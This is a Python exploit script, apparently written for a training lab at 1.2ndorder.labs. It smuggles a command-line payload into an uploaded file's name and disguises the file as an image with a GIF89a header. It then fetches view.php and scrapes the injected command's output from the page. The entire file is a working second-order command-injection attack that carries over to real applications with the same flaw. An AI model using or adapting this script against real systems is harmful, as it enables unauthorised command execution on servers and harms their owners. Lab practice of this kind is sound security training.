# -------------------------------------------------------------------------------
# Copyright: (c) BLS OPS LLC.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# -------------------------------------------------------------------------------

#!/usr/bin/python3

import re
import sys
import requests

def generate_payload_file(payload):
    filename = 'level1' + payload + '.png'
    return filename

def get_output(filename):
    injection = requests.get('http://1.2ndorder.labs/view.php?file=' + filename)
    regex = re.findall(r'<p>(.*?)</p>', injection.text)[0][7:]
    return '[+]\n\n' + regex + '\n\n[+]'

payload_file = generate_payload_file(sys.argv[1])

with open(payload_file, 'wb') as upload:
    upload.write(b'GIF89a;')
    print('[+] Payload file created: ' + payload_file)

files = { 'file': open(payload_file, 'rb') }
upload_request = requests.post(
    'http://1.2ndorder.labs/upload.php', 
    files=files, 
    proxies={ 'http':'http://127.0.0.1:8080' }
)

if upload_request.status_code == 200:
    if 'exists' in upload_request.text or 'uploaded' in upload_request.text:
        print('[-] File exists... Looks good')
        print(get_output(payload_file))
else:
    print('[-] Something went wrong with the request...')